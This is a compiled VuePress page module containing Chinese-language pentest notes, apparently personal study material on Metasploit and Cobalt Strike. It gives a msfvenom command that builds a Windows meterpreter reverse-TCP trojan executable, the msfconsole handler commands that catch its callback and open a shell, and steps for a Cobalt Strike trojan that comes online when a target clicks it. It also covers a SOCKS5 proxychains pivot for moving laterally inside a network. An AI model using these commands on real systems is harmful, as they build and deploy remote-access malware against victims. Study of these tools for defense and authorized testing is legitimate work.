import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as s,c as a,e as i}from"./app-423671c8.js";const t="/assets/image-20230908204405066-5fc1f770.png",c="/assets/image-20230909161000325-34e69b01.png",r="/assets/image-20230909161402504-58b036c0.png",n="/assets/image-20230909165148827-9cf45bc7.png",l="/assets/image-20230909165203180-00bcbcf7.png",d="/assets/image-20230909165510992-594ca4e9.png",o="/assets/image-20230909165551936-7332ca32.png",m={},p=i(`<h1 id="msf生成木马取得shell" tabindex="-1"><a class="header-anchor" href="#msf生成木马取得shell" aria-hidden="true">#</a> MSF生成木马取得shell</h1><h2 id="生成木马" tabindex="-1"><a class="header-anchor" href="#生成木马" aria-hidden="true">#</a> 生成木马</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.116 lport=4545 -f exe -o 456.exe
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><blockquote><p>使用<code>msfvenom</code></p><p>-p 为 paylaod</p><p>-f 为指定生成为exe文件</p><p>-o 为指定文件名字</p></blockquote><h2 id="msf开启监听端口" tabindex="-1"><a class="header-anchor" href="#msf开启监听端口" aria-hidden="true">#</a> msf开启监听端口</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>msfconsole					//进入模块
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.1.116
set lport 4545
run
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="`+t+'" alt="image-20230908204405066"></p><blockquote><p>进入后输入<code>shell</code>可进入终端</p></blockquote><h1 id="cs生成木马取得shell和内网横向代理" tabindex="-1"><a class="header-anchor" href="#cs生成木马取得shell和内网横向代理" aria-hidden="true">#</a> CS生成木马取得shell和内网横向代理</h1><h2 id="生成木马取得shell" tabindex="-1"><a class="header-anchor" href="#生成木马取得shell" aria-hidden="true">#</a> 生成木马取得shell</h2><p><img src="'+c+'" alt="image-20230909161000325"></p><p><img src="'+r+'" alt="image-20230909161402504"></p><blockquote><p>选择好监听器生成即可，目标点击就上线（目标能访问到服务端）</p></blockquote><h2 id="内网横行代理" tabindex="-1"><a class="header-anchor" href="#内网横行代理" aria-hidden="true">#</a> 内网横行代理</h2><p><img src="'+n+'" alt="image-20230909165148827"></p><p><img src="'+l+'" alt="image-20230909165203180"></p><p>选择socks5，然后开启</p><p>在cs的服务端，编辑 <code>vim /etc/proxychains.conf</code>,在文末添加socks5代理服务器，且相对应的端口</p><p><img src="'+d+'" alt="image-20230909165510992"></p><blockquote><p>然后即可用proxychains代理各种kali的工具运行</p></blockquote><p><img src="'+o+'" alt="image-20230909165551936"></p><h1 id="cs与msf联动" tabindex="-1"><a class="header-anchor" href="#cs与msf联动" aria-hidden="true">#</a> cs与msf联动</h1>',22),h=[p];function u(g,_){return s(),a("div",null,h)}const v=e(m,[["render",u],["__file","msf与cs的运用.html.vue"]]);export{v as default};
